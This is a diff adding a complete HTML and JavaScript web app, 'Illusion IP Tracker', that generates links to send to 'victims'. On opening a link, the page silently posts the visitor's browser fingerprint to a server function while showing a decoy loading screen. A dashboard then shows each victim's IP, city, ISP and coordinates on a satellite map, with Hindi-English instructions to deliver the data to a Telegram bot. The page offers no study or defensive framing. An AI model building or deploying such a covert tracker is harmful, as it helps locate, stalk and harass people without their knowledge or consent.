@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Illusion IP Tracker</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<style>
+    * { box-sizing: border-box; }
+    body {
+        background: #0a0a0a;
+        color: #00ff88;
+        font-family: 'Courier New', monospace;
+        margin: 0; padding: 0; min-height: 100vh;
+    }
+    .header {
+        background: #111; border-bottom: 2px solid #00ff88;
+        padding: 20px; text-align: center;
+        box-shadow: 0 0 20px rgba(0,255,136,0.3);
+    }
+    .header h1 {
+        margin: 0; color: #00ff88;
+        text-shadow: 0 0 10px #00ff88;
+        letter-spacing: 3px; font-size: 22px;
+    }
+    .header p {
+        color: #ff0055; margin: 6px 0 0;
+        font-size: 13px; letter-spacing: 1px;
+    }
+    .container { max-width: 1100px; margin: 0 auto; padding: 20px; }
+    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+    @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } }
+    .panel {
+        background: #141414; border: 1px solid #00ff88;
+        border-radius: 8px; padding: 20px;
+        box-shadow: 0 0 15px rgba(0,255,136,0.15);
+    }
+    .panel h2 {
+        margin: 0 0 15px; color: #00ff88;
+        font-size: 16px; letter-spacing: 2px;
+        text-transform: uppercase;
+        border-bottom: 1px dashed #00ff88;
+        padding-bottom: 8px;
+    }
+    input, textarea {
+        width: 100%; padding: 12px; background: #000;
+        border: 1px solid #00ff88; color: #00ff88;
+        font-family: inherit; font-size: 14px;
+        border-radius: 4px; margin-bottom: 12px;
+    }
+    input:focus, textarea:focus { outline: none; box-shadow: 0 0 10px #00ff88; }
+    button {
+        width: 100%; padding: 12px; background: #00ff88;
+        color: #000; border: none; font-weight: bold;
+        font-size: 14px; text-transform: uppercase;
+        letter-spacing: 1px; cursor: pointer;
+        border-radius: 4px; box-shadow: 0 0 10px #00ff88;
+        transition: 0.2s; margin-bottom: 8px;
+    }
+    button:hover { background: #00cc66; box-shadow: 0 0 20px #00ff88; }
+    button.danger { background: #ff0055; box-shadow: 0 0 10px #ff0055; color: #fff; }
+    button.danger:hover { background: #cc0044; }
+    button.secondary { background: #333; color: #00ff88; box-shadow: none; }
+    button.secondary:hover { background: #444; }
+    .link-box {
+        background: #000; border: 1px dashed #ff0055;
+        padding: 12px; border-radius: 4px;
+        word-break: break-all; font-size: 13px;
+        color: #ff0055; margin-bottom: 10px;
+    }
+    .log-entry {
+        background: #0a0a0a; border-left: 3px solid #00ff88;
+        padding: 10px 12px; margin-bottom: 8px;
+        font-size: 12px; border-radius: 3px;
+        cursor: pointer; transition: 0.15s;
+    }
+    .log-entry:hover { background: #1a1a1a; border-left-color: #ff0055; }
+    .log-entry .ip { color: #ff0055; font-weight: bold; font-size: 14px; }
+    .log-entry .time { color: #888; font-size: 11px; }
+    .log-entry .loc { color: #00ff88; }
+    .empty { color: #555; text-align: center; padding: 30px; font-style: italic; }
+    #map { width: 100%; height: 400px; border: 2px solid #ff0055; border-radius: 5px; display: none; margin-top: 15px; }
+    .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 15px; }
+    .stat { background: #000; border: 1px solid #00ff88; padding: 12px; text-align: center; border-radius: 4px; }
+    .stat .num { font-size: 24px; color: #ff0055; font-weight: bold; }
+    .stat .label { font-size: 10px; color: #888; letter-spacing: 1px; text-transform: uppercase; }
+    .toast {
+        position: fixed; bottom: 20px; right: 20px;
+        background: #00ff88; color: #000;
+        padding: 12px 20px; border-radius: 4px;
+        font-weight: bold; box-shadow: 0 0 20px #00ff88;
+        opacity: 0; transition: opacity 0.3s;
+        pointer-events: none; z-index: 9999;
+    }
+    .toast.show { opacity: 1; }
+    .detail-row { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px dashed #222; font-size: 13px; }
+    .detail-row .k { color: #888; }
+    .detail-row .v { color: #00ff88; text-align: right; }
+
+    .footer {
+        text-align: center; color: #888;
+        padding: 25px 20px 20px; font-size: 12px;
+        letter-spacing: 1px; border-top: 1px solid #222;
+        margin-top: 30px; background: #0d0d0d;
+    }
+    .footer .brand { color: #00ff88; font-weight: bold; letter-spacing: 2px; font-size: 13px; }
+    .footer .dev { color: #ff0055; }
+    .footer .copy { color: #666; margin-top: 6px; display: block; }
+
+    /* SIDE BY SIDE ICONS */
+    .footer-social {
+        display: flex;
+        flex-direction: row;
+        justify-content: center;
+        align-items: center;
+        gap: 10px;
+        margin-top: 15px;
+        flex-wrap: nowrap;
+    }
+    .footer-social a {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+        padding: 9px 14px;
+        border-radius: 25px;
+        color: #fff;
+        text-decoration: none;
+        font-size: 12px;
+        font-weight: bold;
+        letter-spacing: 0.5px;
+        transition: all 0.25s ease;
+        border: 2px solid transparent;
+        white-space: nowrap;
+        flex: 0 0 auto;
+    }
+    .footer-social a:hover { transform: translateY(-2px); }
+    .footer-social .yt { background: #ff0000; box-shadow: 0 0 15px rgba(255,0,0,0.5); }
+    .footer-social .yt:hover { box-shadow: 0 0 25px #ff0000; }
+    .footer-social .tg { background: #229ED9; box-shadow: 0 0 15px rgba(34,158,217,0.5); }
+    .footer-social .tg:hover { box-shadow: 0 0 25px #229ED9; }
+    .footer-social svg { width: 16px; height: 16px; fill: #fff; flex-shrink: 0; }
+    @media (max-width: 380px) {
+        .footer-social a { padding: 7px 10px; font-size: 10px; gap: 4px; }
+        .footer-social svg { width: 14px; height: 14px; }
+    }
+</style>
+</head>
+<body>
+
+<div class="header">
+    <h1>🛡 ILLUSION IP TRACKER</h1>
+    <p id="brandTag">Developer: Mr Nilesh</p>
+</div>
+
+<div class="container">
+    <div class="stats">
+        <div class="stat"><div class="num" id="statTotal">0</div><div class="label">Total Hits</div></div>
+        <div class="stat"><div class="num" id="statLinks">0</div><div class="label">Active Links</div></div>
+        <div class="stat"><div class="num" id="statUnique">0</div><div class="label">Unique IPs</div></div>
+    </div>
+
+    <div class="grid">
+        <div class="panel">
+            <h2>⚡ Generate Tracking Link</h2>
+            <input type="text" id="brandName" placeholder="Your name / brand" value="Mr Nilesh">
+            <input type="text" id="note" placeholder="Note (e.g. Victim 1)" value="">
+            <button onclick="generateLink()">🔗 Generate Link</button>
+            <div id="linkOutput"></div>
+            <p style="color: #888; font-size: 11px; margin-top: 10px;">
+                ℹ️ Ye link victim ko bhejo. Jab wo kholenge, unka data tumhare Telegram bot pe aa jaayega.
+            </p>
+        </div>
+
+        <div class="panel">
+            <h2>📡 Captured Victims</h2>
+            <div id="logList"><div class="empty">No data yet — generate a link and wait.</div></div>
+            <button class="danger" onclick="clearAll()" style="margin-top: 10px;">🗑 Clear All Logs</button>
+        </div>
+    </div>
+
+    <div class="panel" style="margin-top: 20px;">
+        <h2>🗺 Target Details</h2>
+        <div id="details"><div class="empty">Click any captured entry to view details.</div></div>
+        <div id="map"></div>
+    </div>
+</div>
+
+<div class="footer">
+    <span class="brand">ILLUSION IP TRACKER</span>
+    <span class="copy">© 2026 — <span class="dev">Developed by Mr Nilesh</span></span>
+
+    <div class="footer-social">
+        <a href="https://www.youtube.com/@illusion5kviews" target="_blank" class="yt" title="YouTube">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/>
+            </svg>
+            YouTube
+        </a>
+        <a href="https://t.me/illusion5kviews" target="_blank" class="tg" title="Telegram">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z"/>
+            </svg>
+            Telegram
+        </a>
+    </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+    const STORAGE_KEY = 'illusion_ip_tracker_logs';
+    let logs = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+    let map = null;
+    let marker = null;
+
+    function isVictimVisit() {
+        const params = new URLSearchParams(window.location.search);
+        return params.get('track') === '1';
+    }
+
+    async function captureVictim() {
+        try {
+            const params = new URLSearchParams(window.location.search);
+            const note = params.get('note') || '';
+            const brand = params.get('brand') || '';
+
+            const res = await fetch('/.netlify/functions/track', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    note: note,
+                    brand: brand,
+                    referrer: document.referrer || 'direct',
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: window.screen.width + 'x' + window.screen.height,
+                    platform: navigator.platform,
+                    pageUrl: window.location.href
+                })
+            });
+            const result = await res.json();
+            console.log('Track result:', result);
+        } catch (err) {
+            console.error('capture fail', err);
+        }
+    }
+
+    if (isVictimVisit()) {
+        captureVictim();
+        document.body.innerHTML = `
+            <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#0a0a0a;color:#888;font-family:monospace;text-align:center;padding:20px;">
+                <div>
+                    <h1 style="color:#00ff88;">Loading...</h1>
+                    <p>Ye ek normal page hai. Aap kuch aur dekh sakte ho.</p>
+                </div>
+            </div>
+        `;
+    }
+
+    function loadLogs() {
+        logs = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+        renderStats();
+        renderLogs();
+    }
+
+    function renderStats() {
+        document.getElementById('statTotal').textContent = logs.length;
+        const unique = new Set(logs.map(l => l.ip)).size;
+        document.getElementById('statUnique').textContent = unique;
+        document.getElementById('statLinks').textContent = logs.length ? 1 : 0;
+    }
+
+    function renderLogs() {
+        const el = document.getElementById('logList');
+        if (!logs.length) {
+            el.innerHTML = '<div class="empty">No data yet — generate a link and wait.</div>';
+            return;
+        }
+        el.innerHTML = logs.slice().reverse().map((l, i) => {
+            const idx = logs.length - 1 - i;
+            const t = new Date(l.timestamp).toLocaleString();
+            const city = l.geo && l.geo.city ? l.geo.city : 'Unknown';
+            const country = l.geo && l.geo.country_name ? l.geo.country_name : '';
+            return `<div class="log-entry" onclick="viewDetail(${idx})">
+                <div class="ip">${l.ip}</div>
+                <div class="loc">📍 ${city}${country ? ', ' + country : ''}</div>
+                <div class="time">🕐 ${t} ${l.note ? '· ' + l.note : ''}</div>
+            </div>`;
+        }).join('');
+    }
+
+    function viewDetail(idx) {
+        const l = logs[idx];
+        if (!l) return;
+        const g = l.geo || {};
+        const details = document.getElementById('details');
+        details.innerHTML = `
+            <div class="detail-row"><span class="k">IP Address</span><span class="v">${l.ip}</span></div>
+            <div class="detail-row"><span class="k">Country</span><span class="v">${g.country_name || 'N/A'} ${g.country_code ? '('+g.country_code+')' : ''}</span></div>
+            <div class="detail-row"><span class="k">City</span><span class="v">${g.city || 'N/A'}</span></div>
+            <div class="detail-row"><span class="k">Region</span><span class="v">${g.region || 'N/A'}</span></div>
+            <div class="detail-row"><span class="k">ISP / Org</span><span class="v">${g.org || 'N/A'}</span></div>
+            <div class="detail-row"><span class="k">Coordinates</span><span class="v">${g.latitude || 'N/A'}, ${g.longitude || 'N/A'}</span></div>
+            <div class="detail-row"><span class="k">User Agent</span><span class="v" style="font-size:10px;">${l.userAgent || 'N/A'}</span></div>
+            <div class="detail-row"><span class="k">Captured At</span><span class="v">${new Date(l.timestamp).toLocaleString()}</span></div>
+        `;
+        if (g.latitude && g.longitude) {
+            document.getElementById('map').style.display = 'block';
+            if (map) { map.remove(); map = null; }
+            setTimeout(() => {
+                map = L.map('map').setView([g.latitude, g.longitude], 13);
+                L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', { attribution: 'Tiles © Esri' }).addTo(map);
+                marker = L.marker([g.latitude, g.longitude]).addTo(map).bindPopup(`<b>${l.ip}</b>`).openPopup();
+                setTimeout(() => { if (map) map.invalidateSize(); }, 300);
+            }, 100);
+        }
+    }
+
+    function generateLink() {
+        const brand = document.getElementById('brandName').value.trim() || 'Mr Nilesh';
+        const note = document.getElementById('note').value.trim();
+
+        const base = window.location.origin;
+        const params = new URLSearchParams();
+        params.set('track', '1');
+        if (brand) params.set('brand', brand);
+        if (note) params.set('note', note);
+
+        const link = base + '/?' + params.toString();
+        document.getElementById('linkOutput').innerHTML = `
+            <div class="link-box" id="genLink">${link}</div>
+            <button onclick="copyLink()">📋 Copy Link</button>
+            <button class="secondary" onclick="openLink()">🚀 Open Link (test)</button>
+        `;
+        toast('Link generated!');
+    }
+
+    function copyLink() {
+        const link = document.getElementById('genLink').innerText;
+        navigator.clipboard.writeText(link).then(() => toast('Copied!')).catch(() => {
+            const t = document.createElement('textarea');
+            t.value = link; document.body.appendChild(t); t.select();
+            document.execCommand('copy'); document.body.removeChild(t);
+            toast('Copied!');
+        });
+    }
+
+    function openLink() {
+        window.open(document.getElementById('genLink').innerText, '_blank');
+    }
+
+    function clearAll() {
+        if (!confirm('Saare logs delete?')) return;
+        localStorage.removeItem(STORAGE_KEY);
+        logs = [];
+        renderStats(); renderLogs();
+        document.getElementById('details').innerHTML = '<div class="empty">Click any entry.</div>';
+        document.getElementById('map').style.display = 'none';
+        toast('Cleared.');
+    }
+
+    function toast(msg) {
+        const t = document.getElementById('toast');
+        t.textContent = msg; t.classList.add('show');
+        setTimeout(() => t.classList.remove('show'), 2000);
+    }
+
+    loadLogs();
+</script>
+</body>
+</html>
